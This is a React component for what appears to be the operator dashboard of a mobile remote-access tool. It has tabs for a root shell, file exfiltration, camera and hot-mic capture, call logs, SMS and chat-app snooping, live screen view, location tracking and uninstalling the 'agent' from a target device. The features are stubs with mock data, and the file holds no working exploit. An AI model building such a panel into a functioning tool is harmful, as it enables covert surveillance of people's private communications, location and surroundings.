
'use client';

import {
  Smartphone,
  Terminal as TerminalIcon,
  Folder,
  Cpu,
  Shield,
  Bot,
  Camera,
  Mic,
  Phone,
  MessageSquare,
  Share,
  Clock,
  Waypoints,
  ToggleLeft,
  ToggleRight,
  Download,
  Video,
  VideoOff,
  MapPin,
  Eye,
  MessageCircle,
  Bell,
  LayoutDashboard,
  Settings as SettingsIcon,
  Menu,
  Pencil,
  FileDown,
  Activity,
  Compass,
  Trash2,
} from 'lucide-react';
import React from 'react';

import { Button } from '@/components/ui/button';
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import { Label } from '@/components/ui/label';
import { Switch } from '@/components/ui/switch';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { TopNav, TopNavItem } from '@/components/ui/topnav';
import { Separator } from '@/components/ui/separator';
import { Sidebar } from '@/components/ui/sidebar';
import { Settings } from '@/components/settings';
import type { Device } from '@/lib/types';
import { mockCalls, mockSms } from '@/lib/mock-data';
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Terminal } from '@/components/terminal';
import { cn } from '@/lib/utils';
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from './ui/alert-dialog';

const socialApps = [
    { name: 'WhatsApp', icon: <MessageCircle className="h-6 w-6" /> },
    { name: 'Instagram', icon: <MessageCircle className="h-6 w-6" /> },
    { name: 'Signal', icon: <MessageCircle className="h-6 w-6" /> },
];

const mockTelemetry = [
  { name: 'Accelerometer', status: 'active', icon: <Activity className="h-5 w-5 text-success" /> },
  { name: 'Gyroscope', status: 'active', icon: <Compass className="h-5 w-5 text-success" /> },
  { name: 'GPS', status: 'active', icon: <MapPin className="h-5 w-5 text-success" /> },
  { name: 'Proximity', status: 'inactive', icon: <Activity className="h-5 w-5 text-muted-foreground" /> },
  { name: 'Ambient Light', status: 'active', icon: <Activity className="h-5 w-5 text-success" /> },
];

interface DashboardLayoutProps {
    selectedDevice: Device;
    onDeviceSelect: (device: Device | null) => void;
}

type TabValue = 
  | 'dashboard' 
  | 'terminal' 
  | 'file_explorer' 
  | 'frida' 
  | 'camera' 
  | 'mic'
  | 'call_log' 
  | 'sms' 
  | 'live_view' 
  | 'timeline' 
  | 'mitre' 
  | 'locations' 
  | 'device_info';


export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect }: DashboardLayoutProps) {
  const [isIos, setIsIos] = React.useState(false);
  const [activeTab, setActiveTab] = React.useState<TabValue>('dashboard');
  const [selectedDevice, setSelectedDevice] = React.useState<Device>(initialDevice);
  const [deviceName, setDeviceName] = React.useState(selectedDevice.name);
  const [tempDeviceName, setTempDeviceName] = React.useState(selectedDevice.name);
  const [isEditDialogOpen, setIsEditDialogOpen] = React.useState(false);
  const [confirmationGuid, setConfirmationGuid] = React.useState('');

  React.useEffect(() => {
    setSelectedDevice(initialDevice);
    setDeviceName(initialDevice.name);
    setTempDeviceName(initialDevice.name);
  }, [initialDevice]);

  const handleDeviceNameSave = () => {
    setDeviceName(tempDeviceName);
    // Here you would typically also update the device name on your backend
    setIsEditDialogOpen(false);
  }

  const handleDeviceDeselect = () => {
    onDeviceSelect(null);
  };

  const handleDeleteAgent = () => {
    // This is where you would call the API to uninstall the agent
    console.log(`Uninstalling agent for ${selectedDevice.guid}`);
    onDeviceSelect(null); // Go back to device selection screen
  };


  return (
    <div className="flex min-h-screen w-full flex-col bg-background">
        <header className="flex h-16 items-center justify-between border-b px-4 md:px-6 bg-card">
            <div className='flex items-center gap-4'>
                <Sidebar selectedDeviceGuid={selectedDevice.guid} onDeviceSelect={onDeviceSelect}>
                    <Button variant="ghost" size="icon">
                        <Menu className="h-6 w-6" />
                        <span className="sr-only">Toggle sidebar</span>
                    </Button>
                </Sidebar>
                 <div className="flex items-center gap-2">
                    <h1 className="text-lg font-semibold md:text-xl">{deviceName}</h1>
                    <Dialog open={isEditDialogOpen} onOpenChange={setIsEditDialogOpen}>
                      <DialogTrigger asChild>
                        <Pencil className="h-4 w-4 text-muted-foreground hover:text-foreground cursor-pointer" />
                      </DialogTrigger>
                      <DialogContent>
                        <DialogHeader>
                          <DialogTitle>Edit Device Name</DialogTitle>
                          <DialogDescription>
                            Enter a new name for your device. This will only change the display name.
                          </DialogDescription>
                        </DialogHeader>
                        <Input 
                          value={tempDeviceName} 
                          onChange={(e) => setTempDeviceName(e.target.value)}
                          placeholder="Enter new device name"
                        />
                        <DialogFooter>
                          <Button variant="outline" onClick={() => setIsEditDialogOpen(false)}>Cancel</Button>
                          <Button onClick={handleDeviceNameSave}>Save</Button>
                        </DialogFooter>
                      </DialogContent>
                    </Dialog>
                  </div>
            </div>
            <div className='flex items-center gap-4'>
                 <p className="text-sm text-muted-foreground">{selectedDevice.guid}</p>
                 <Settings onDeviceDeselect={handleDeviceDeselect}/>
            </div>
        </header>
        <div className="flex flex-1 flex-col">
            <TopNav>
                <TopNavItem icon={<LayoutDashboard />} label="Dashboard" isActive={activeTab === 'dashboard'} onClick={() => setActiveTab('dashboard')} />
                <TopNavItem icon={<TerminalIcon />} label="Terminal" isActive={activeTab === 'terminal'} onClick={() => setActiveTab('terminal')} />
                <TopNavItem icon={<Folder />} label="File Explorer" isActive={activeTab === 'file_explorer'} onClick={() => setActiveTab('file_explorer')} />
                <TopNavItem icon={<Cpu />} label="Frida Toolkit" isActive={activeTab === 'frida'} onClick={() => setActiveTab('frida')}/>
                <TopNavItem icon={<Camera />} label="Camera" isActive={activeTab === 'camera'} onClick={() => setActiveTab('camera')} />
                <TopNavItem icon={<Mic />} label="Mic" isActive={activeTab === 'mic'} onClick={() => setActiveTab('mic')} />
                <TopNavItem icon={<Phone />} label="Call Log" isActive={activeTab === 'call_log'} onClick={() => setActiveTab('call_log')} />
                <TopNavItem icon={<MessageSquare />} label="SMS" isActive={activeTab === 'sms'} onClick={() => setActiveTab('sms')} />
                <TopNavItem icon={<Share />} label="Live View" isActive={activeTab === 'live_view'} onClick={() => setActiveTab('live_view')} />
                <TopNavItem icon={<Clock />} label="Timeline" isActive={activeTab === 'timeline'} onClick={() => setActiveTab('timeline')} />
                <TopNavItem icon={<Waypoints />} label="MITRE ATT&CK" isActive={activeTab === 'mitre'} onClick={() => setActiveTab('mitre')} />
                <TopNavItem icon={<MapPin />} label="Locations" isActive={activeTab === 'locations'} onClick={() => setActiveTab('locations')} />
                <TopNavItem icon={<Shield />} label="Device Info" isActive={activeTab === 'device_info'} onClick={() => setActiveTab('device_info')} />
            </TopNav>
            <main className="flex-1 p-4 grid grid-cols-1 lg:grid-cols-3 gap-4">
                <div className={cn("space-y-4", activeTab === 'dashboard' ? "lg:col-span-2" : "lg:col-span-3")}>
                    {activeTab === 'dashboard' && (
                        <Card>
                            <CardHeader>
                            <CardTitle>Network</CardTitle>
                            </CardHeader>
                            <CardContent>
                            <Table>
                                <TableHeader>
                                <TableRow>
                                    <TableHead>Status</TableHead>
                                    <TableHead>Device IP</TableHead>
                                    <TableHead>OS Version</TableHead>
                                    <TableHead>Connection Type</TableHead>
                                    <TableHead>Last Seen</TableHead>
                                </TableRow>
                                </TableHeader>
                                <TableBody>
                                <TableRow>
                                    <TableCell>
                                        <span className="flex items-center gap-2 text-success">
                                        <span className="relative flex h-3 w-3">
                                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-success opacity-75"></span>
                                            <span className="relative inline-flex rounded-full h-3 w-3 bg-success"></span>
                                        </span>
                                        Active
                                        </span>
                                    </TableCell>
                                    <TableCell>{selectedDevice.ip}</TableCell>
                                    <TableCell>{selectedDevice.os}</TableCell>
                                    <TableCell>{selectedDevice.connectionType}</TableCell>
                                    <TableCell>Just now</TableCell>
                                </TableRow>
                                </TableBody>
                            </Table>
                            </CardContent>
                        </Card>
                    )}
                    {activeTab === 'file_explorer' && (
                        <Card>
                        <CardHeader>
                            <CardTitle>File Explorer</CardTitle>
                        </CardHeader>
                        <CardContent className="text-center text-muted-foreground">
                            <p>/sdcard/Downloads/</p>
                            <div className="mt-4">
                            <Button>
                                <Download className="mr-2 h-4 w-4" />
                                Exfiltrate Files
                            </Button>
                            </div>
                        </CardContent>
                        </Card>
                    )}
                     {activeTab === 'terminal' && (
                        <Terminal 
                            deviceType={selectedDevice.os}
                            currentContext="root shell" 
                        />
                    )}
                    {activeTab === 'camera' && (
                        <Card>
                        <CardHeader>
                            <CardTitle>Camera</CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            <div className="grid grid-cols-2 gap-4">
                            <div>
                                <Button className="w-full">
                                <Video className="mr-2 h-4 w-4" />
                                Front Camera
                                </Button>
                            </div>
                            <div>
                                <Button className="w-full">
                                <VideoOff className="mr-2 h-4 w-4" />
                                Back Camera
                                </Button>
                            </div>
                            </div>
                        </CardContent>
                        </Card>
                    )}
                    {activeTab === 'mic' && (
                        <Card>
                        <CardHeader>
                            <CardTitle>Microphone</CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            <div className="grid grid-cols-2 gap-4">
                                <Button className="w-full">
                                    <Mic className="mr-2 h-4 w-4" />
                                    Hot Mic
                                </Button>
                                <Button className="w-full">
                                    <FileDown className="mr-2 h-4 w-4" />
                                    Record Audio
                                </Button>
                            </div>
                        </CardContent>
                        </Card>
                    )}
                    {activeTab === 'call_log' && (
                        <Card>
                        <CardHeader className="flex flex-row items-center justify-between">
                            <CardTitle>Call Log</CardTitle>
                            <Button variant="outline">
                                <FileDown className="mr-2 h-4 w-4" />
                                Download Contacts
                            </Button>
                        </CardHeader>
                        <CardContent>
                             <Table>
                                <TableHeader>
                                    <TableRow>
                                        <TableHead>Contact</TableHead>
                                        <TableHead>Type</TableHead>
                                        <TableHead>Date</TableHead>
                                        <TableHead>Duration</TableHead>
                                    </TableRow>
                                </TableHeader>
                                <TableBody>
                                    {mockCalls.length > 0 ? mockCalls.map((call, index) => (
                                        <TableRow key={index}>
                                            <TableCell>{call.name || call.number}</TableCell>
                                            <TableCell>{call.type}</TableCell>
                                            <TableCell>{call.date}</TableCell>
                                            <TableCell>{call.duration}</TableCell>
                                        </TableRow>
                                    )) : (
                                        <TableRow>
                                            <TableCell colSpan={4} className="text-center">No call logs available.</TableCell>
                                        </TableRow>
                                    )}
                                </TableBody>
                            </Table>
                        </CardContent>
                        </Card>
                    )}
                    {activeTab === 'sms' && (
                        <Card>
                        <CardHeader>
                            <CardTitle>SMS & Social Media</CardTitle>
                        </CardHeader>
                        <CardContent>
                            <Table>
                                <TableHeader>
                                    <TableRow>
                                        <TableHead>From</TableHead>
                                        <TableHead>Message</TableHead>
                                        <TableHead>Date</TableHead>
                                    </TableRow>
                                </TableHeader>
                                <TableBody>
                                    {mockSms.length > 0 ? mockSms.map((sms, index) => (
                                        <TableRow key={index}>
                                            <TableCell>{sms.from}</TableCell>
                                            <TableCell>{sms.message}</TableCell>
                                            <TableCell>{sms.date}</TableCell>
                                        </TableRow>
                                    )) : (
                                        <TableRow>
                                            <TableCell colSpan={3} className="text-center">No SMS messages available.</TableCell>
                                        </TableRow>
                                    )}
                                </TableBody>
                            </Table>
                        </CardContent>
                        </Card>
                    )}
                    {activeTab === 'live_view' && (
                        <Card>
                        <Tabs defaultValue="screen_view" className="w-full">
                             <TabsList className="border-b border-border/60 w-full justify-start rounded-none bg-transparent p-0 grid grid-cols-2">
                                <TabsTrigger value="screen_view" className="bg-transparent rounded-none border-b-2 border-transparent data-[state=active]:border-ring data-[state=active]:text-ring data-[state=active]:shadow-none -mb-px">
                                    <Eye className="mr-2" /> Live Screen
                                </TabsTrigger>
                                <TabsTrigger value="chat_explorer" className="bg-transparent rounded-none border-b-2 border-transparent data-[state=active]:border-ring data-[state=active]:text-ring data-[state=active]:shadow-none -mb-px">
                                    <MessageCircle className="mr-2" /> Chat Explorer
                                </TabsTrigger>
                            </TabsList>
                            <TabsContent value="screen_view" className="p-4">
                            <CardHeader className="p-2">
                                <CardTitle>Live Screen View</CardTitle>
                            </CardHeader>
                            <CardContent className="text-center text-muted-foreground space-y-4 p-2">
                                <div className="aspect-video bg-black rounded-md flex items-center justify-center">
                                    <p>Live screen feed would be here.</p>
                                </div>
                                <Button>
                                    <Download className="mr-2 h-4 w-4" />
                                    Take Screenshot
                                </Button>
                            </CardContent>
                            </TabsContent>
                            <TabsContent value="chat_explorer" className="p-4">
                            <CardHeader className="p-2">
                                <CardTitle>Social Media Chat Explorer</CardTitle>
                            </CardHeader>
                            <CardContent className="space-y-4 p-2">
                                <div className="p-4 border rounded-lg bg-background">
                                <h3 className="font-semibold text-lg mb-2">Notifications</h3>
                                <div className="text-sm text-muted-foreground flex items-center p-2 rounded-md bg-muted/50 cursor-pointer hover:bg-muted">
                                    <Bell className="mr-2 h-4 w-4 text-success"/>
                                    <span className="font-bold">WhatsApp</span>&nbsp;running in background, click to view chats.
                                </div>
                                </div>

                                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                {socialApps.map(app => (
                                    <Card key={app.name} className="bg-muted/30 hover:bg-muted/60 cursor-pointer">
                                    <CardContent className="p-4 flex flex-col items-center justify-center">
                                        {app.icon}
                                        <span className="mt-2 font-semibold">{app.name}</span>
                                        <Button variant="link" className="text-xs">Explore Chats</Button>
                                    </CardContent>
                                    </Card>
                                ))}
                                </div>

                                <Separator />

                                <div>
                                <h3 className="font-semibold text-lg mb-2">Manual Exploration</h3>
                                <p className="text-sm text-muted-foreground">Select an app to explore its data, even if it's not running.</p>
                                </div>
                            </CardContent>
                            </TabsContent>
                        </Tabs>
                        </Card>
                    )}
                    {activeTab === 'timeline' && (
                        <Card>
                        <CardHeader>
                            <CardTitle>Device Activity Timeline</CardTitle>
                        </CardHeader>
                        <CardContent className="text-center text-muted-foreground">
                            <p>
                            A timeline of device activity and C2 commands will be shown
                            here.
                            </p>
                        </CardContent>
                        </Card>
                    )}
                    {activeTab === 'mitre' && (
                        <Card>
                        <CardHeader className="flex flex-row items-center justify-between">
                            <CardTitle>MITRE ATT&CK Matrix</CardTitle>
                            <div className="flex items-center space-x-2">
                            <Label htmlFor="os-toggle">
                                {isIos ? 'iOS' : 'Android'}
                            </Label>
                            <Switch
                                id="os-toggle"
                                checked={isIos}
                                onCheckedChange={setIsIos}
                            />
                            </div>
                        </CardHeader>
                        <CardContent className="text-center text-muted-foreground">
                            <p>
                            MITRE ATT&CK Matrix for {isIos ? 'iOS' : 'Android'} will be
                            displayed here.
                            </p>
                        </CardContent>
                        </Card>
                    )}
                   
                    {activeTab === 'frida' && (
                        <Card>
                        <CardHeader>
                            <CardTitle>Frida Toolkit</CardTitle>
                        </CardHeader>
                        <CardContent className="text-center text-muted-foreground">
                            <p>Frida Toolkit integration will be available here.</p>
                        </CardContent>
                        </Card>
                    )}
                    {activeTab === 'locations' && (
                        <Card>
                        <CardHeader>
                            <CardTitle>Locations</CardTitle>
                        </CardHeader>
                        <CardContent className="text-center text-muted-foreground">
                            <p>Location tracking will be displayed here.</p>
                        </CardContent>
                        </Card>
                    )}
                    {activeTab === 'device_info' && (
                        <Card>
                            <CardHeader>
                                <CardTitle>Device Telemetry</CardTitle>
                                <CardDescription>Live sensor data from the device.</CardDescription>
                            </CardHeader>
                            <CardContent>
                                <Table>
                                <TableHeader>
                                    <TableRow>
                                    <TableHead>Sensor</TableHead>
                                    <TableHead>Status</TableHead>
                                    </TableRow>
                                </TableHeader>
                                <TableBody>
                                    {mockTelemetry.map((sensor) => (
                                    <TableRow key={sensor.name}>
                                        <TableCell className="flex items-center gap-2">
                                        {sensor.icon}
                                        {sensor.name}
                                        </TableCell>
                                        <TableCell>
                                        <span className={cn("px-2 py-1 rounded-full text-xs", sensor.status === 'active' ? "bg-success/20 text-success-foreground" : "bg-muted text-muted-foreground")}>
                                            {sensor.status}
                                        </span>
                                        </TableCell>
                                    </TableRow>
                                    ))}
                                </TableBody>
                                </Table>
                            </CardContent>
                            <CardFooter className="border-t pt-6">
                                 <AlertDialog>
                                    <AlertDialogTrigger asChild>
                                        <Button variant="destructive">
                                            <Trash2 className="mr-2 h-4 w-4" />
                                            Delete Agent
                                        </Button>
                                    </AlertDialogTrigger>
                                    <AlertDialogContent>
                                    <AlertDialogHeader>
                                        <AlertDialogTitle>Are you absolutely sure?</AlertDialogTitle>
                                        <AlertDialogDescription>
                                        This action cannot be undone. This will permanently uninstall the agent from the target device and remove all its data. To confirm, please type the device GUID below.
                                        </AlertDialogDescription>
                                    </AlertDialogHeader>
                                    <Input 
                                        placeholder="Enter device GUID to confirm"
                                        value={confirmationGuid}
                                        onChange={(e) => setConfirmationGuid(e.target.value)}
                                        className="font-code"
                                    />
                                    <AlertDialogFooter>
                                        <AlertDialogCancel onClick={() => setConfirmationGuid('')}>Cancel</AlertDialogCancel>
                                        <AlertDialogAction
                                        disabled={confirmationGuid !== selectedDevice.guid}
                                        className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
                                        onClick={handleDeleteAgent}
                                        >
                                        Uninstall Agent
                                        </AlertDialogAction>
                                    </AlertDialogFooter>
                                    </AlertDialogContent>
                                </AlertDialog>
                            </CardFooter>
                        </Card>
                    )}
                </div>
                {activeTab === 'dashboard' && (
                    <div className="lg:col-span-1">
                        <Card>
                            <CardHeader>
                            <CardTitle>Details</CardTitle>
                            </CardHeader>
                            <CardContent>
                            <div className="space-y-2">
                                <p><strong>GUID:</strong> {selectedDevice.guid}</p>
                                <p><strong>OS:</strong> {selectedDevice.os}</p>
                                <p><strong>IP:</strong> {selectedDevice.ip}</p>
                            </div>
                            </CardContent>
                        </Card>
                    </div>
                )}
            </main>
        </div>
    </div>
  );
}
